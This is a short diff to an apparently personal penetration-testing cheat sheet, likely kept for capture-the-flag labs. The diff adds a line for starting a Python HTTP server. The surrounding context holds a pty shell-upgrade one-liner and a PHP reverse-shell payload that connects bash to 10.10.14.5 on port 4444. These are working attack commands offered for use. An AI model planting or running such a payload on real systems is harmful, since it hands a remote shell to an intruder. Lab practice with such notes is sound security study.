@@ -5,6 +5,9 @@ Scriopt for run root (maybe without password):
 Switch to a interractive shell:
     python3 -c 'import pty; pty.spawn("/bin/bash")'
 
+Start a python sever:
+    python3 -m http.server 8000
+
 Reverse shell script:
     <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"); ?>
 
